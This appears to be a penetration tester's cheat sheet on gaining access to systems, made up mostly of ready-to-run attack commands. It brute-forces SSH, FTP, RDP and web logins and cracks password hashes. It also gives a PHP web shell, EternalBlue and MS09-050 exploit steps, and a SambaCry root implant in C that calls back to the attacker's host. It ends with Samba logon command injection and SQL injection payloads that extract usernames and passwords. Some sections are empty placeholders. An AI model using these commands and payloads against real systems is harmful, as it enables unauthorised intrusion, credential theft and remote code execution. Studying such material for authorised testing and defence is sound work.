# Gaining Access



#### Gaining Access

**Default Credentials**

```
# anonymous:anonymous
# guest:guest
# admin:admin
# admin:adminadmin
```

**Hydra**

```
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

```
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

**Patator**

```
patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```

```
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

**Crowbar**

```
sudo apt install crowbar # version 0.4.1
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > ./rockyou-UTF8.txt
crowbar -b rdp -s $TARGET/32 -u administrator -C rockyou-UTF8.txt -n 1
```

**John the Ripper**

```
unshadow passwd.txt shadow.txt > unshadow.txt
john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password-protected RAR files.

```
rar2john backup.rar > hash.txt
john --format=rar hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Hashcat**

Modes

* SHA256: 1400
* SHA512: 1800
* RAR5: 13000

Attacks

* Dictionary: 0

```
hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt
```

```
hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt
```

**Local File Inclusions**

Find a way to upload a PHP command shell.

```
echo "<?php echo shell_exec($_GET['cmd']); ?>" > shell.php
```

**MS09-050**

**CVE-2009-3103: SMBv2 Command Value Vulnerability**\
This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7.

```
nmap $TARGET -p445 --script smb-vuln-cve2009-3103
wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
```

**EternalBlue**

**CVE-2017-0144**\
This vulnerability impacts Windows. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes).

```
git clone https://github.com/worawit/MS17-010
cd MS17-010
pip install impacket # mysmb.py ships with this exploit. offsec also hosts it on their GitHub
python checker.py $TARGET # check if target is vulnerable and find an accessible Named Pipe
python zzz_exploit.py $TARGET $NAMED_PIPE
```

**SambaCry**

**CVE-2017-7494**\
Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired.

```
mkdir exploits
cd exploits
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
mv implant.c implant.bak
vim implant.c
```

An example of a modified implant.c file. This source file gets compiled by the provided Python script.

```
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
setresuid(0,0,0);
system("ping -c2 $LHOST");
}
```

My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.

```
sudo tcpdump -i tun0 icmp
```

Run the exploit.

```
python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
```

**ShellShock via SMTP**

**CVE-2014-6271**

```
# technique goes here
```

**Shell via Samba Logon Command**

```
mkdir /mnt/$TARGET
sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
sudo cp $EXPLOIT /mnt/$TARGET
smbclient //$TARGET/$SHARE
logon "=`$EXPLOIT`"
```

**SQL Injection**

Check for a SQLi vulnerability

```
'
```

Check the quality of SQLi vulnerability

```
' or 1=1 --
```

Get the number of columns of a table (increment the number until there is an error; ex: if 4 triggers an error, there are 3 columns).

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
```

Get all table names (look for user/admin tables).

```
' UNION ALL SELECT table_name,null,null FROM all_tables --
```

Get all possible column names within the entire database (look for values like "username" and "password").

```
' UNION ALL SELECT column_name,null,null FROM user_tab_cols --
```

Get usernames and passwords from the users table.

```
' UNION ALL SELECT username,password,null FROM users --
```

Get usernames and passwords from the admins table.

```
' UNION ALL SELECT username,password,null FROM admins --
```

Get the database software version.

```
' UNION ALL SELECT banner,null,null FROM v$version --
```

Get the database service account name.

```
' UNION ALL SELECT user,null,null FROM dual --
```

Execute a database function (ex: user(), database(), etc.).

```
# query goes here
```

Execute shell command (ex: find current working directory).

```
# query goes here
```

Common Oracle-based SQL Query Errors

| ID        | Error                                                          | Explanation                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| --------- | -------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ORA-00923 | FROM keyword not found where expected                          | Occurs when you try to execute a SELECT or REVOKE statement without a FROM keyword in its correct form and place. If you are seeing this error, the keyword FROM is spelled incorrectly, misplaced, or altogether missing. In Oracle, the keyword FROM must follow the last selected item in a SELECT statement or in the case of a REVOKE statement, the privileges. If the FROM keyword is missing or otherwise incorrect, you will see ORA-00923. |
| ORA-00933 | SQL command not properly ended                                 | The SQL statement ends with an inappropriate clause. Correct the syntax by removing the inappropriate clauses.                                                                                                                                                                                                                                                                                                                                       |
| ORA-00936 | Missing expression                                             | You left out an important chunk of what you were trying to run. This can happen fairly easily, but provided below are two examples that are the most common occurrence of this issue.The first example is the product of missing information in a SELECT statement. The second is when the FROM clause within the statement is omitted.                                                                                                              |
| ORA-01785 | ORDER BY item must be the number of a SELECT-list expression   |                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ORA-01789 | Query block has incorrect number of result columns             |                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ORA-01790 | Expression must have same datatype as corresponding expression | Re-write the SELECT statement so that each matching column is the same data type. Try replacing the columns with null. For example, if you only want to see the table\_name and the output is 3 columns, use "table\_name,null,null" not "table\_name,2,3".                                                                                                                                                                                          |

MySQL Database Queries

```
SELECT * FROM targetdb.usertbl; # database.table
USE targetdb;
SELECT * FROM usertbl;
```

Add a new user to a SQL database.

```
INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
```
